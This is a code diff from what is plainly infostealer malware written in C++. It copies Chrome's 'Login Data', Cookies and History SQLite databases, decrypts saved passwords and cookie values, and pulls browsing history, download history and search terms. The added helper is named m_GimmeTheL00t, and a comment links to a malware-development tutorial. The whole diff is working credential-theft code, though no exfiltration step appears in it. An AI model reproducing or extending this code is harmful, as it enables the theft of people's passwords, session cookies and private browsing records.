@@ -4,22 +4,24 @@
 void mod_Info::test_Data() {
 	std::cout << "CHROME PROFILES DUMP_TEST:\n";
 	for (Chrome_Profile profile : this->m_ChromeProfiles()) {
-	//	std::cout << "\nPATH: " << profile.strPath << "\n";
-	//	std::string Login_Path = profile.strPath + "Login Data";
-	//	std::cout << "\nNAME: " << profile.strName << "\n";
-	//	std::cout << "GAIA_NAME: " << profile.strGaiaName << "\n";
-	//	std::cout << "SHORTCUT_NAME: " << profile.strShortCutName << "\n";
-	//	std::cout << "USERNAME: " << profile.strUserName << "\n";
-	//	std::cout << "HOSTED_DOMAIN: " << profile.strHostedDomain << "\nPASSWORDS FOR THIS PROFILE:\n";
-	//	profile.strPath += "Login Data";
-	//	for (Chrome_Login_Data data : this->m_ProfilePasswords(profile.strPath)) {
-	//		std::cout << "URL: " << data.strUrl << "\n";
-	//		std::cout << "Action: " << data.strAction<< "\n";
-	//		std::cout << "User: " << data.strUser<< "\n";
-	//		std::cout << "Pass: " << data.strPassword<< "\n";
-	//	}
-		std::cout << "COOKIES FOR " << profile.strName << "\n==================================\n";
-		for (Cookie nCookie : this->m_ProfileCookies(profile.strPath, profile.strName)) {
+		/////////////////////////////////////////////////////
+		//                     PASSWORDS
+		/////////////////////////////////////////////////////
+		/*for (Chrome_Login_Data data : this->m_ProfilePasswords(profile.strPath)) {
+			std::cout << "URL: " << data.strUrl << "\n";
+			std::cout << "Action: " << data.strAction << "\n";
+			std::cout << "User: " << data.strUser << "\n";
+			std::cout << "Pass: " << data.strPassword << "\n";
+		}*/
+		/////////////////////////////////////////////////////
+		/////////////////////////////////////////////////////
+
+
+		/////////////////////////////////////////////////////
+		//                     COOKIES
+		/////////////////////////////////////////////////////
+		/*std::cout << "COOKIES FOR " << profile.strName << "\n==================================\n";
+		for (Cookie nCookie : this->m_ProfileCookies(profile.strPath)) {
 			if (nCookie.strValue != "" && nCookie.strValue != "V20 Cookie :v" && nCookie.strValue != "ENCRYPTED_ERR") {
 				std::cout << "creation_utc: " << nCookie.strCreationUTC << "\n";
 				std::cout << "host_key: " << nCookie.strHostKey << "\n";
@@ -31,9 +33,94 @@ void mod_Info::test_Data() {
 				std::cout << "last_updatE_utc: " << nCookie.strLastUpdateUTC << "\n";
 			}
 		}
-		std::cout << "\n==================================\n";
-	}
+		std::cout << "\n==================================\n";*/
+		/////////////////////////////////////////////////////
+		/////////////////////////////////////////////////////
 
+
+		/////////////////////////////////////////////////////
+		//                     HISTORY
+		/////////////////////////////////////////////////////
+		/*std::cout << "HISTORY FOR " << profile.strName << "\n==================================\n";
+		for (Chrome_History& nHistory : this->m_ProfileBrowsingHistory(profile.strPath)) {
+			std::cout << "URL: " << nHistory.strURL << "\n";
+			std::cout << "TITLE: " << nHistory.strTitle << "\n";
+			std::cout << "VISIT_COUNT: " << nHistory.strVisitCount << "\n";
+			std::cout << "LAST_TIME: " << nHistory.strLastVisitTime << "\n";
+		}
+		std::cout << "\n==================================\n"; */
+		/////////////////////////////////////////////////////
+		/////////////////////////////////////////////////////
+
+
+		/////////////////////////////////////////////////////
+		//              DOWNLOAD  HISTORY
+		/////////////////////////////////////////////////////
+		/*std::cout << "DOWNLOAD HISTORY FOR " << profile.strName << "\n==================================\n";
+		for (Chrome_Download_History& nDownload : this->m_ProfileDownloadHistory(profile.strPath)) {
+			std::cout << "PATH: " << nDownload.strTargetPath << "\n";
+			std::cout << "START: " << nDownload.strStartTime << "\n";
+			std::cout << "BYTES: " << nDownload.strTotalBytes << "\n";
+			std::cout << "URL: " << nDownload.strTabURL << "\n";
+			std::cout << "MIME: " << nDownload.strMimeType << "\n";
+		}
+		std::cout << "\n==================================\n";*/
+		/////////////////////////////////////////////////////
+		/////////////////////////////////////////////////////
+
+
+
+		/*std::cout << "SEARCH TERMS FOR " << profile.strName << "\n==================================\n";
+		for (Chrome_Search_Terms& nTerm : this->m_ProfileSearchTerms(profile.strPath)) {
+			std::cout << "TERM: " << nTerm.strTerm << "\n";
+		}
+		std::cout<< "\n==================================\n";*/
+		//	std::cout << "\nPATH: " << profile.strPath << "\n";
+		//	std::string Login_Path = profile.strPath + "Login Data";
+		//	std::cout << "\nNAME: " << profile.strName << "\n";
+		//	std::cout << "GAIA_NAME: " << profile.strGaiaName << "\n";
+		//	std::cout << "SHORTCUT_NAME: " << profile.strShortCutName << "\n";
+		//	std::cout << "USERNAME: " << profile.strUserName << "\n";
+		//	std::cout << "HOSTED_DOMAIN: " << profile.strHostedDomain << "\nPASSWORDS FOR THIS PROFILE:\n";
+			
+	}
+}
+
+std::vector<std::vector<std::string>> mod_Info::m_GimmeTheL00t(const char* cQuery, const char* cPath) {
+	std::vector<std::vector<std::string>> vcOut;
+	std::string strRandomPath = RandomID(7);
+	if (::CopyFileA((LPCSTR)cPath, (LPCSTR)strRandomPath.c_str(), FALSE)) {
+		sqlite3* db;
+
+		int iRet = sqlite3_open(strRandomPath.c_str(), &db);
+
+		if (iRet == SQLITE_OK) {
+			sqlite3_stmt* pStmt;
+
+			iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);
+
+			if (iRet == SQLITE_OK) {
+				iRet = sqlite3_step(pStmt);
+				while (iRet == SQLITE_ROW) {
+					int iColumnCount = sqlite3_column_count(pStmt);
+					std::vector<std::string> vcTemp;
+					if (iColumnCount > 0) {
+						for (int index = 0; index < iColumnCount; index++) {
+							vcTemp.push_back(reinterpret_cast<const char*>(sqlite3_column_text(pStmt, index)));
+						}
+					}
+					vcOut.push_back(vcTemp);
+					iRet = sqlite3_step(pStmt);
+				}
+			}
+			sqlite3_finalize(pStmt);
+		}
+	} else {
+		_DBG_("No se pudo copiar la bd del usuario ", GetLastError());
+	}
+	::DeleteFile(strRandomPath.c_str());
+
+	return vcOut;
 }
 
 //https://github.com/oomar400/Malware-Development/tree/main/Malware101%3AInfostealers
@@ -124,7 +211,6 @@ std::string mod_Info::m_DecryptMasterKey(const std::string& strPass) {
 	
 	return strOut;
 }
-
 
 std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 	int iBuffSize = 4096;
@@ -240,94 +326,130 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 
 std::vector<Chrome_Login_Data> mod_Info::m_ProfilePasswords(const std::string& strUserPath) {
 	std::vector<Chrome_Login_Data> vcOut;
-	std::string randomR = RandomID(6);
-	if (::CopyFileA((LPCSTR)strUserPath.c_str(), (LPCSTR)randomR.c_str(), FALSE)) {
-		sqlite3* db;
-
-		int iRet = sqlite3_open(randomR.c_str(), &db);
-
-		if (iRet == SQLITE_OK) {
-			const char* cQuery = "SELECT origin_url, action_url, username_value, password_value FROM logins;";
-			sqlite3_stmt* pStmt;
-
-			iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);
-			if (iRet == SQLITE_OK) {
-				iRet = sqlite3_step(pStmt);
-				while (iRet == SQLITE_ROW) {
-					if (sqlite3_column_bytes(pStmt, 3) > 0 && sqlite3_column_bytes(pStmt, 2) > 0) {
-						Chrome_Login_Data nPassword;
-						nPassword.strUrl = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 0));
-						nPassword.strAction = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 1));
-						nPassword.strUser = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 2));
-						std::string temp_Pass = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 3));
-						nPassword.strPassword = this->m_DecryptData(temp_Pass);
-						vcOut.push_back(nPassword);
-					}
-					iRet = sqlite3_step(pStmt);
+	/*
+	TABLE  : logins
+	COLUMNS: origin_url, action_url, username_value, password_value
+	*/
+	std::string strPath = strUserPath + "Login Data";
+	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT origin_url, action_url, username_value, password_value FROM logins;", strPath.c_str());
+	if (vcData.size() > 0) {
+		for (std::vector<std::string>& item : vcData) {
+			if (item.size() == 4) {
+				if (item[0].size() > 0 && item[1].size() > 0 && item[2].size() > 0 && item[3].size() > 0) {
+					Chrome_Login_Data nPassword;
+					nPassword.strUrl      = item[0];
+					nPassword.strAction   = item[1];
+					nPassword.strUser     = item[2];
+					nPassword.strPassword = this->m_DecryptData(item[3]);
+					
+					vcOut.push_back(nPassword);
 				}
 			}
-			sqlite3_finalize(pStmt);
 		}
+	}
+	return vcOut;
+}
 
+std::vector<Cookie> mod_Info::m_ProfileCookies(const std::string& strUserPath) {
+	std::vector<Cookie> vcOut;
+	/*
+	TABLE   : cookies
+	COLUMNS : creation_utc, host_key, name, encrypted_value, path, expires_utc, last_access_utc, last_update_utc
+	*/
+	std::string strPath = strUserPath + "Network\\Cookies";
+	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT  creation_utc, host_key, name, encrypted_value, path, expires_utc, last_access_utc, last_update_utc FROM cookies WHERE encrypted_value != '';", strPath.c_str());
+	if (vcData.size() > 0) {
+		for (std::vector<std::string>& item : vcData) {
+			if (item.size() == 8) {
+				if (item[3].size() > 0) {
+					Cookie nCookie;
+					nCookie.strCreationUTC   = item[0];
+					nCookie.strHostKey       = item[1];
+					nCookie.strName          = item[2];
 
-		sqlite3_close(db);
+					//Decrypt value
+					nCookie.strValue = this->m_DecryptData(item[3]);
 
-		DeleteFile((LPCSTR)randomR.c_str());
-	}else {
-		__DBG_("No se puco copiar la bd del usuario ");
-		__DBG_(GetLastError());
+					nCookie.strPath          = item[4];
+					nCookie.strExpiresUTC    = item[5];
+					nCookie.strLastAccessUTC = item[6];
+					nCookie.strLastUpdateUTC = item[7];
+
+					vcOut.push_back(nCookie);
+				}
+			}
+		}
 	}
 
 	return vcOut;
 }
 
-std::vector<Cookie> mod_Info::m_ProfileCookies(const std::string& strUserPath, const std::string& name) {
-	std::vector<Cookie> vcOut;
-	std::string strPath = strUserPath + "Network\\Cookies";
-	std::string randomR = name; //  RandomID(6);
-	if (::CopyFileA((LPCSTR)strPath.c_str(), (LPCSTR)randomR.c_str(), FALSE)) {
-		sqlite3* db;
-
-		int iRet = sqlite3_open(randomR.c_str(), &db);
-
-		if (iRet == SQLITE_OK) {
-			const char* cQuery = "SELECT  creation_utc, host_key, name, encrypted_value, path, expires_utc, last_access_utc, last_update_utc FROM cookies WHERE encrypted_value != '';";
-			sqlite3_stmt* pStmt;
-
-			iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);
-			if (iRet == SQLITE_OK) {
-				iRet = sqlite3_step(pStmt);
-				while (iRet == SQLITE_ROW) {
-					if (sqlite3_column_bytes(pStmt, 3) > 0) {
-						Cookie nCookie;
-						nCookie.strCreationUTC = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 0));
-						nCookie.strHostKey = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 1));
-						nCookie.strName = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 2));
-
-						//Decrypt value
-						std::string temp_Pass = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 3));
-						nCookie.strValue = this->m_DecryptData(temp_Pass);
-
-						nCookie.strPath = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 4));
-						nCookie.strExpiresUTC = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 5));
-						nCookie.strLastAccessUTC = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 6));
-						nCookie.strLastUpdateUTC = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 7));
-						vcOut.push_back(nCookie);
-					}
-					iRet = sqlite3_step(pStmt);
-				}
+std::vector<Chrome_Search_Terms> mod_Info::m_ProfileSearchTerms(const std::string& strUserPath) {
+	std::vector<Chrome_Search_Terms> vcOut;
+	/*
+	TABLE    : keyword_search_terms
+	COLUMN(s): term
+	*/
+	std::string strPath = strUserPath + "History";
+	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT term FROM keyword_search_terms;", strPath.c_str());
+	if (vcData.size() > 0) {
+		for (std::vector<std::string>& item : vcData) {
+			if (item.size() == 1) {
+				Chrome_Search_Terms nTerm;
+				nTerm.strTerm = item[0];
+				vcOut.push_back(nTerm);
 			}
-			sqlite3_finalize(pStmt);
 		}
-
-		sqlite3_close(db);
-
-		//DeleteFile((LPCSTR)randomR.c_str());
-	} else {
-		__DBG_("No se puco copiar la bd del usuario ");
-		__DBG_(GetLastError());
 	}
+	return vcOut;
+}
 
+std::vector<Chrome_History> mod_Info::m_ProfileBrowsingHistory(const std::string& strUserPath) {
+	std::vector<Chrome_History> vcOut;
+	/*
+	TABLE   : urls
+	COLUMNS : url title visit_count last_visit_time
+	COUNT   : 4
+	*/
+	std::string strPath = strUserPath + "History";
+	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT url, title, visit_count, last_visit_time FROM urls;", strPath.c_str());
+	if (vcData.size() > 0) {
+		for (std::vector<std::string>& item : vcData) {
+			if (item.size() == 4) {
+				Chrome_History nHistory;
+				nHistory.strURL           = item[0];
+				nHistory.strTitle         = item[1];
+				nHistory.strVisitCount    = item[2];
+				nHistory.strLastVisitTime = item[3];
+				vcOut.push_back(nHistory);
+			}
+		}
+	}
+	return vcOut;
+}
+
+std::vector<Chrome_Download_History> mod_Info::m_ProfileDownloadHistory(const std::string& strUserPath) {
+	std::vector<Chrome_Download_History> vcOut;
+	/*
+	TABLE   : downloads
+	COLUMNS :	target_path	 start_time	 total_bytes tab_url	 mime_type
+	COUNT   : 5
+	*/
+	std::string strPath = strUserPath + "History";
+	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT target_path, start_time, total_bytes, tab_url, mime_type FROM downloads;", strPath.c_str());
+	if (vcData.size() > 0) {
+		for (std::vector<std::string>& item : vcData) {
+			if (item.size() == 5) {
+				Chrome_Download_History nDownload;
+				nDownload.strTargetPath = item[0];
+				nDownload.strStartTime  = item[1];
+				nDownload.strTotalBytes = item[2];
+				nDownload.strTabURL     = item[3];
+				nDownload.strMimeType   = item[4];
+				vcOut.push_back(nDownload);
+			}
+		}
+	}
 	return vcOut;
 }
 
